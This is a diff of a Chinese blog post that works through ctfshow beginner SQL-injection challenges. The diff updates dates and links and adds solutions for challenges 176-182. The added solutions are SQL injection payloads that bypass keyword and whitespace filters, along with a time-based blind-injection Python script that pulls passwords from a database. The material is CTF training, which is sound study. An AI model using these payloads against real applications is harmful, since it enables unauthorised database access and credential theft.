@@ -11,15 +11,16 @@
   <meta name="description" content="ctfshow web入门 sql注入部分(不断更新)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow入门sql注入部分">
-<meta property="og:url" content="https://wh1tecell.top/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/index.html">
+<meta property="og:url" content="https://wh1tecell.top/2021/01/01/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/index.html">
 <meta property="og:site_name" content="Wh1tecell&#39;blog">
 <meta property="og:description" content="ctfshow web入门 sql注入部分(不断更新)">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
 <meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAlSf.png">
 <meta property="og:image" content="https://s3.ax1x.com/2021/01/04/siHhi8.png">
-<meta property="article:published_time" content="2020-11-14T04:58:15.000Z">
-<meta property="article:modified_time" content="2021-01-05T16:00:00.062Z">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/06/sEDm4I.png">
+<meta property="article:published_time" content="2021-01-01T04:58:15.000Z">
+<meta property="article:modified_time" content="2021-01-06T06:32:32.919Z">
 <meta property="article:author" content="Wh1tecell">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
@@ -177,8 +178,8 @@
   
 
         
-        <a href="/2020/11/14/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/" class="archive-article-date">
-  	<time datetime="2020-11-14T04:58:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-14</time>
+        <a href="/2021/01/01/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/" class="archive-article-date">
+  	<time datetime="2021-01-01T04:58:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-01</time>
 </a>
         
       </header>
@@ -224,7 +225,24 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># @Author:Y4tacker</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show&#x2F;api&#x2F;v5.php?id&#x3D;1&#39; and &quot;</span><br><span class="line"></span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">i &#x3D; 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i &#x3D; i + 1</span><br><span class="line">    head &#x3D; 32</span><br><span class="line">    tail &#x3D; 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid &#x3D; (head + tail) &gt;&gt; 1</span><br><span class="line">        payload &#x3D; f&#39;1&#x3D;if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#39;</span><br><span class="line">        try:</span><br><span class="line">            r &#x3D; requests.get(url + payload, timeout&#x3D;0.5)</span><br><span class="line">            tail &#x3D; mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head &#x3D; mid + 1</span><br><span class="line">    if head !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>我一直在想，如果关键字被过滤了，怎么去判读字段长度？</p>
+<h2 id="176"><a href="#176" class="headerlink" title="176"></a>176</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>万能密码<br><code>1&#39; or 1=1--+</code>然后最后一行发现了<code>flag</code></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>首先输入，发现返回出错，估计是有过滤<br><code>1&#39; union select 1,2,3--+</code><br>尝试大小写<br><code>1&#39; uNion sElect 1,2,3--+</code>发现有回显了<br>然后直接查flag<br><code>1&#39; uNion sElect 1,2,password from ctfshow_user --+</code></p>
+<h2 id="177"><a href="#177" class="headerlink" title="177"></a>177</h2><p>解法一</p>
+<p>空格过滤了<code>/**/</code>绕过<br><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23</code></p>
+<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>万能密码<br><code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p>
+<h2 id="178"><a href="#178" class="headerlink" title="178"></a>178</h2><h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>过滤了空格与*号等用<code>%09</code>绕过 (%09 为 TAB键)<br><code>1&#39;%09union%09select%091,2,3%23</code><br>之后一把梭得到flag<code>1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%23</code></p>
+<h3 id="解法二-2"><a href="#解法二-2" class="headerlink" title="解法二"></a>解法二</h3><p>万能密码<br><code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p>
+<h2 id="179"><a href="#179" class="headerlink" title="179"></a>179</h2><h2 id="解法一-2"><a href="#解法一-2" class="headerlink" title="解法一"></a>解法一</h2><p><code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p>
+<h2 id="解法二-3"><a href="#解法二-3" class="headerlink" title="解法二"></a>解法二</h2><p>这次还把<code>%09</code>过滤了，测试了下发现<code>%0c</code>可以绕过(%0c为换行)<br><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></p>
+<h2 id="180-182"><a href="#180-182" class="headerlink" title="180-182"></a>180-182</h2><p><strong>sql</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>把所有空格都过滤了,注释也被过滤了</p>
+<p><code>&#39;or(mid(password,1,1)=&#39;f&#39;)and&#39;1&#39;=&#39;1</code></p>
+<p>分析一下这个payload </p>
+<p>我们只能查询一语句,所以我们需要精确定位，因为都知道password是flag{xxx}，所以使用sql中的mid函数截取</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sEDm4I"><img src="https://s3.ax1x.com/2021/01/06/sEDm4I.png" alt="sEDm4I.png"></a></p>
+<p>再说一下limit函数  limit 1代表的是只筛选一条数据，limit 2就代表筛选2条数据， limit 0,1代表是从最开始 筛选一条数据，也就是只筛选第一条数据，limit 1,1代表只筛选第二条数据</p>
+<h2 id="183"><a href="#183" class="headerlink" title="183"></a>183</h2><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>我一直在想，如果关键字被过滤了，怎么去判读字段长度？</p>
 <p>其实盲注的话，貌似就没有这个麻烦了</p>
 <p>做题之前先判断哪些关键字被过滤了，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1&#39;or1&#x3D;1#</span><br><span class="line">index.php?id&#x3D;1&#39;or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
@@ -279,7 +297,7 @@
     
     <br>
     <strong>本文链接：</strong>
-    https://wh1tecell.top/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/
+    https://wh1tecell.top/2021/01/01/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/
     <br>
     <strong>版权声明：</strong>
     本作品采用
@@ -365,7 +383,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://wh1tecell.top/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://wh1tecell.top/2021/01/01/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -379,18 +397,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          ctfshow入门命令执行部分
+          利用hexo+github搭建blog小结
         
       </div>
     </a>
   
   
-    <a href="/2020/11/14/sqlmap%E4%B9%8Btamper%E8%84%9A%E6%9C%AC/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">sqlmap之tamper脚本</div>
+    <a href="/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">MSF利用MS17_010渗透内网主机</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -417,7 +435,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#171"><span class="toc-number">1.</span> <span class="toc-text">171</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172"><span class="toc-number">2.</span> <span class="toc-text">172</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#173"><span class="toc-number">3.</span> <span class="toc-text">173</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#174"><span class="toc-number">4.</span> <span class="toc-text">174</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#175"><span class="toc-number">5.</span> <span class="toc-text">175</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">6.</span> <span class="toc-text">web7</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#171"><span class="toc-number">1.</span> <span class="toc-text">171</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172"><span class="toc-number">2.</span> <span class="toc-text">172</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#173"><span class="toc-number">3.</span> <span class="toc-text">173</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#174"><span class="toc-number">4.</span> <span class="toc-text">174</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#175"><span class="toc-number">5.</span> <span class="toc-text">175</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#176"><span class="toc-number">6.</span> <span class="toc-text">176</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">6.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">6.2.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#177"><span class="toc-number">7.</span> <span class="toc-text">177</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-1"><span class="toc-number">7.1.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#178"><span class="toc-number">8.</span> <span class="toc-text">178</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-1"><span class="toc-number">8.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-2"><span class="toc-number">8.2.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#179"><span class="toc-number">9.</span> <span class="toc-text">179</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-2"><span class="toc-number">10.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-3"><span class="toc-number">11.</span> <span class="toc-text">解法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#180-182"><span class="toc-number">12.</span> <span class="toc-text">180-182</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#183"><span class="toc-number">13.</span> <span class="toc-text">183</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">14.</span> <span class="toc-text">web7</span></a></li></ol>
                     </div>
                 </span>
             </div>
